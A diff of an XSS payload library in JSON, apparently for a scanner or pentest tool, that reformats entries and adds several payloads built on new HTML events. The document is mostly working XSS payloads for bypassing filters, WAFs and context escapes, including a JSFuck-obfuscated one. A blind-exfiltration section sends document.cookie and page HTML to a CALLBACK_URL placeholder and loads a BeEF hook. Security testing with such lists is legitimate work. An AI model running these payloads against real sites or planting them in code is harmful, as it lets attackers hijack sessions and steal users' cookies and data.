@@ -40,82 +40,216 @@
         {
           "name": "Basic Alert",
           "description": "Most basic XSS payload using script tags",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "script"],
+          "tags": [
+            "basic",
+            "script"
+          ],
           "payload": "<script>alert(1)</script>"
         },
         {
           "name": "Image OnError",
           "description": "Uses image tag with onerror event handler",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "event-handler"],
+          "tags": [
+            "basic",
+            "event-handler"
+          ],
           "payload": "<img src=x onerror=alert(1)>"
         },
         {
           "name": "SVG OnLoad",
           "description": "SVG element with onload event",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "svg"],
+          "tags": [
+            "basic",
+            "svg"
+          ],
           "payload": "<svg onload=alert(1)>"
         },
         {
           "name": "Input AutoFocus",
           "description": "Input element that automatically focuses and triggers XSS",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "input"],
+          "tags": [
+            "basic",
+            "input"
+          ],
           "payload": "<input autofocus onfocus=alert(1)>"
         },
         {
           "name": "Body OnLoad",
           "description": "Body tag with onload event handler",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "body"],
+          "tags": [
+            "basic",
+            "body"
+          ],
           "payload": "<body onload=alert(1)>"
         },
         {
           "name": "Iframe SrcDoc",
           "description": "Iframe with embedded HTML in srcdoc attribute",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "iframe"],
+          "tags": [
+            "basic",
+            "iframe"
+          ],
           "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
         },
         {
           "name": "Details/Summary",
           "description": "HTML5 details element with ontoggle event",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "html5"],
+          "tags": [
+            "basic",
+            "html5"
+          ],
           "payload": "<details ontoggle=alert(1)><summary>Click me</summary></details>"
         },
         {
           "name": "Video OnError",
           "description": "Video element with onerror handler",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "video"],
+          "tags": [
+            "basic",
+            "video"
+          ],
           "payload": "<video><source onerror=alert(1)></video>"
         },
         {
           "name": "Marquee OnStart",
           "description": "Marquee element with onstart event",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["basic", "marquee"],
+          "tags": [
+            "basic",
+            "marquee"
+          ],
           "payload": "<marquee onstart=alert(1)>XSS</marquee>"
         },
         {
           "name": "Form OnSubmit",
           "description": "Form with onsubmit event handler",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["basic", "form"],
+          "tags": [
+            "basic",
+            "form"
+          ],
           "payload": "<form onsubmit=alert(1)><input type=submit></form>"
+        },
+        {
+          "name": "Popover BeforeToggle",
+          "description": "Popover API onbeforetoggle \u2014 works on hidden inputs (2024+)",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "popover",
+            "2026"
+          ],
+          "payload": "<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>"
+        },
+        {
+          "name": "ScrollEnd Event",
+          "description": "onscrollend fires when scroll completes \u2014 not in WAF blocklists",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "scroll",
+            "2026"
+          ],
+          "payload": "<div onscrollend=alert(1) style=\"overflow:auto;height:50px\"><br><br><br><br></div>"
+        },
+        {
+          "name": "Content Visibility",
+          "description": "content-visibility CSS triggers auto state change event",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "css",
+            "2026"
+          ],
+          "payload": "<div oncontentvisibilityautostatechange=alert(1) style=\"display:block;content-visibility:auto\"></div>"
+        },
+        {
+          "name": "Dialog OnClose",
+          "description": "Dialog element with onclose event handler",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "dialog",
+            "2026"
+          ],
+          "payload": "<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>"
+        },
+        {
+          "name": "Search Element AutoFocus",
+          "description": "New HTML search element with autofocus (2023+)",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "search",
+            "2026"
+          ],
+          "payload": "<search onfocus=alert(1) autofocus tabindex=0>test</search>"
+        },
+        {
+          "name": "Scroll Snap Change",
+          "description": "CSS Scroll Snap event \u2014 Chrome 129+, brand new",
+          "contexts": [
+            "html"
+          ],
+          "severity": "high",
+          "tags": [
+            "basic",
+            "scroll-snap",
+            "2026"
+          ],
+          "payload": "<address onscrollsnapchange=alert(1) style=\"overflow-y:hidden;scroll-snap-type:x\"><div style=\"scroll-snap-align:center\">1337</div></address>"
         }
       ]
     },
@@ -126,97 +260,161 @@
         {
           "name": "Case Variation",
           "description": "Mixed case to bypass case-sensitive filters",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "case"],
+          "tags": [
+            "bypass",
+            "case"
+          ],
           "payload": "<ScRiPt>alert(1)</ScRiPt>"
         },
         {
           "name": "Double URL Encoding",
           "description": "Double URL encoded payload to bypass filters",
-          "contexts": ["url", "attribute"],
+          "contexts": [
+            "url",
+            "attribute"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "encoding"],
+          "tags": [
+            "bypass",
+            "encoding"
+          ],
           "payload": "%253Cscript%253Ealert(1)%253C/script%253E"
         },
         {
           "name": "HTML Entities",
           "description": "HTML entity encoding to bypass basic filters",
-          "contexts": ["html", "attribute"],
+          "contexts": [
+            "html",
+            "attribute"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "entities"],
+          "tags": [
+            "bypass",
+            "entities"
+          ],
           "payload": "&lt;script&gt;alert(1)&lt;/script&gt;"
         },
         {
           "name": "Concatenation",
           "description": "String concatenation in JavaScript context",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["bypass", "concat"],
+          "tags": [
+            "bypass",
+            "concat"
+          ],
           "payload": "al\\\nert(1)"
         },
         {
           "name": "Unicode Bypass",
           "description": "Unicode characters to bypass keyword filters",
-          "contexts": ["html", "script"],
+          "contexts": [
+            "html",
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "unicode"],
+          "tags": [
+            "bypass",
+            "unicode"
+          ],
           "payload": "<script>\\u0061lert(1)</script>"
         },
         {
           "name": "Template Literals",
           "description": "ES6 template literals for filter bypass",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["bypass", "es6"],
+          "tags": [
+            "bypass",
+            "es6"
+          ],
           "payload": "`${alert(1)}`"
         },
         {
           "name": "WAF Bypass - Nested Events",
           "description": "Nested event handlers to bypass WAF detection",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["bypass", "waf", "nested"],
+          "tags": [
+            "bypass",
+            "waf",
+            "nested"
+          ],
           "payload": "<svg><animatetransform onbegin=alert(1)>"
         },
         {
           "name": "DOM Clobbering",
           "description": "Use DOM clobbering to bypass filters",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "clobbering"],
+          "tags": [
+            "bypass",
+            "clobbering"
+          ],
           "payload": "<form id=x tabindex=1 onfocus=alert(1)></form>"
         },
         {
           "name": "Fragment Identifier",
           "description": "Use fragment identifier for bypass",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "fragment"],
+          "tags": [
+            "bypass",
+            "fragment"
+          ],
           "payload": "location='javascript:alert(1)'"
         },
         {
           "name": "Protocol Bypass",
           "description": "Alternative protocols to bypass restrictions",
-          "contexts": ["url"],
+          "contexts": [
+            "url"
+          ],
           "severity": "high",
-          "tags": ["bypass", "protocol"],
+          "tags": [
+            "bypass",
+            "protocol"
+          ],
           "payload": "data:text/html,<script>alert(1)</script>"
         },
         {
           "name": "Comment Bypass",
           "description": "HTML comments to split filtered keywords",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "comment"],
+          "tags": [
+            "bypass",
+            "comment"
+          ],
           "payload": "<img src=x one<!---->rror=alert(1)>"
         },
         {
           "name": "Tab/Newline Bypass",
           "description": "Use tabs and newlines to bypass keyword filters",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["bypass", "whitespace"],
+          "tags": [
+            "bypass",
+            "whitespace"
+          ],
           "payload": "<img\tsrc=x\non\nerror=alert(1)>"
         }
       ]
@@ -228,81 +426,133 @@
         {
           "name": "Attribute Break-out",
           "description": "Break out of HTML attribute context",
-          "contexts": ["attribute"],
+          "contexts": [
+            "attribute"
+          ],
           "severity": "high",
-          "tags": ["context", "attribute"],
+          "tags": [
+            "context",
+            "attribute"
+          ],
           "payload": "\" onmouseover=alert(1) \""
         },
         {
           "name": "JavaScript String Escape",
           "description": "Escape from JavaScript string context",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["context", "string"],
+          "tags": [
+            "context",
+            "string"
+          ],
           "payload": "';alert(1);//"
         },
         {
           "name": "CSS Expression",
           "description": "CSS expression for older IE browsers",
-          "contexts": ["css"],
+          "contexts": [
+            "css"
+          ],
           "severity": "medium",
-          "tags": ["context", "css", "ie"],
+          "tags": [
+            "context",
+            "css",
+            "ie"
+          ],
           "payload": "expression(alert(1))"
         },
         {
           "name": "URL JavaScript Protocol",
           "description": "JavaScript protocol in URL context",
-          "contexts": ["url"],
+          "contexts": [
+            "url"
+          ],
           "severity": "high",
-          "tags": ["context", "url"],
+          "tags": [
+            "context",
+            "url"
+          ],
           "payload": "javascript:alert(1)"
         },
         {
           "name": "Comment Break-out",
           "description": "Break out of HTML comment context",
-          "contexts": ["comment"],
+          "contexts": [
+            "comment"
+          ],
           "severity": "medium",
-          "tags": ["context", "comment"],
+          "tags": [
+            "context",
+            "comment"
+          ],
           "payload": "--><script>alert(1)</script><!--"
         },
         {
           "name": "JSON Context Escape",
           "description": "Escape from JSON context in script tag",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["context", "json"],
+          "tags": [
+            "context",
+            "json"
+          ],
           "payload": "</script><script>alert(1)</script><script>"
         },
         {
           "name": "CSS Import",
           "description": "CSS import with javascript protocol",
-          "contexts": ["css"],
+          "contexts": [
+            "css"
+          ],
           "severity": "medium",
-          "tags": ["context", "css", "import"],
+          "tags": [
+            "context",
+            "css",
+            "import"
+          ],
           "payload": "@import'javascript:alert(1)'"
         },
         {
           "name": "Event Handler in Attribute",
           "description": "Event handler when injected in any attribute",
-          "contexts": ["attribute"],
+          "contexts": [
+            "attribute"
+          ],
           "severity": "high",
-          "tags": ["context", "event"],
+          "tags": [
+            "context",
+            "event"
+          ],
           "payload": "x\" autofocus onfocus=\"alert(1)"
         },
         {
           "name": "CDATA Break-out",
           "description": "Break out of CDATA section in XML/XHTML",
-          "contexts": ["comment"],
+          "contexts": [
+            "comment"
+          ],
           "severity": "medium",
-          "tags": ["context", "cdata"],
+          "tags": [
+            "context",
+            "cdata"
+          ],
           "payload": "]]><script>alert(1)</script><![CDATA["
         },
         {
           "name": "Meta Refresh XSS",
           "description": "Meta refresh with javascript protocol",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["context", "meta"],
+          "tags": [
+            "context",
+            "meta"
+          ],
           "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
         }
       ]
@@ -314,73 +564,120 @@
         {
           "name": "Base64 Decode",
           "description": "Base64 encoded payload with decoding",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "high",
-          "tags": ["advanced", "base64"],
+          "tags": [
+            "advanced",
+            "base64"
+          ],
           "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>"
         },
         {
           "name": "DOM Manipulation",
           "description": "Create script element via DOM manipulation",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "dom"],
+          "tags": [
+            "advanced",
+            "dom"
+          ],
           "payload": "var s=document.createElement('script');s.src='data:text/javascript,alert(1)';document.head.appendChild(s);"
         },
         {
           "name": "JSFuck Obfuscation",
           "description": "Heavily obfuscated JavaScript using only 6 characters",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "obfuscation"],
+          "tags": [
+            "advanced",
+            "obfuscation"
+          ],
           "payload": "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[])[+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]])()"
         },
         {
           "name": "Function Constructor",
           "description": "Use Function constructor to execute code",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "constructor"],
+          "tags": [
+            "advanced",
+            "constructor"
+          ],
           "payload": "Function('alert(1)')()"
         },
         {
           "name": "Event Handler Chain",
           "description": "Chain multiple event handlers for stealth",
-          "contexts": ["html"],
+          "contexts": [
+            "html"
+          ],
           "severity": "medium",
-          "tags": ["advanced", "chain"],
+          "tags": [
+            "advanced",
+            "chain"
+          ],
           "payload": "<div onmouseover=\"this.onclick=function(){alert(1)}\" onclick=\"\">Hover then click</div>"
         },
         {
           "name": "Polyglot XSS",
           "description": "Universal XSS payload that works in multiple contexts",
-          "contexts": ["html", "attribute", "script"],
+          "contexts": [
+            "html",
+            "attribute",
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "polyglot"],
+          "tags": [
+            "advanced",
+            "polyglot"
+          ],
           "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
         },
         {
           "name": "RegExp Constructor",
           "description": "Use RegExp constructor with source property",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "regexp"],
+          "tags": [
+            "advanced",
+            "regexp"
+          ],
           "payload": "RegExp.prototype.toString=function(){return'alert(1)'};//.toString()"
         },
         {
           "name": "Error Handler Abuse",
           "description": "Trigger error handlers to execute code",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "error"],
+          "tags": [
+            "advanced",
+            "error"
+          ],
           "payload": "window.onerror=alert;throw 1"
         },
         {
           "name": "Mutation Observer",
           "description": "Use MutationObserver to trigger payload",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["advanced", "mutation"],
+          "tags": [
+            "advanced",
+            "mutation"
+          ],
           "payload": "new MutationObserver(alert).observe(document,{childList:1});document.body.appendChild(document.createElement('div'))"
         }
       ]
@@ -392,63 +689,100 @@
         {
           "name": "Image Exfiltration",
           "description": "Exfiltrate data via image request to external server",
-          "contexts": ["html", "script"],
+          "contexts": [
+            "html",
+            "script"
+          ],
           "severity": "high",
-          "tags": ["blind", "exfiltration"],
+          "tags": [
+            "blind",
+            "exfiltration"
+          ],
           "payload": "<script>new Image().src='http://CALLBACK_URL/xss?'+document.cookie</script>",
           "requires_callback": true
         },
         {
           "name": "Fetch API Exfiltration",
           "description": "Use fetch API to send data to external server",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["blind", "fetch"],
+          "tags": [
+            "blind",
+            "fetch"
+          ],
           "payload": "fetch('http://CALLBACK_URL/xss', {method:'POST', body: document.documentElement.outerHTML})",
           "requires_callback": true
         },
         {
           "name": "WebSocket Exfiltration",
           "description": "Use WebSocket to send real-time data",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "high",
-          "tags": ["blind", "websocket"],
+          "tags": [
+            "blind",
+            "websocket"
+          ],
           "payload": "var ws=new WebSocket('ws://CALLBACK_URL/ws');ws.onopen=function(){ws.send(document.cookie)}",
           "requires_callback": true
         },
         {
           "name": "DNS Exfiltration",
           "description": "Exfiltrate via DNS queries (subdomain)",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["blind", "dns"],
+          "tags": [
+            "blind",
+            "dns"
+          ],
           "payload": "fetch('http://'+btoa(document.cookie)+'.CALLBACK_URL')",
           "requires_callback": true
         },
         {
           "name": "BeEF Hook",
           "description": "Load BeEF (Browser Exploitation Framework) hook",
-          "contexts": ["html", "script"],
+          "contexts": [
+            "html",
+            "script"
+          ],
           "severity": "high",
-          "tags": ["blind", "beef"],
+          "tags": [
+            "blind",
+            "beef"
+          ],
           "payload": "<script src=\"http://CALLBACK_URL:3000/hook.js\"></script>",
           "requires_callback": true
         },
         {
           "name": "CSP Bypass Report",
           "description": "Trigger CSP violation report to exfiltrate data",
-          "contexts": ["script"],
+          "contexts": [
+            "script"
+          ],
           "severity": "medium",
-          "tags": ["blind", "csp"],
+          "tags": [
+            "blind",
+            "csp"
+          ],
           "payload": "fetch('http://CALLBACK_URL/report',{method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie})})",
           "requires_callback": true
         },
         {
           "name": "Service Worker Registration",
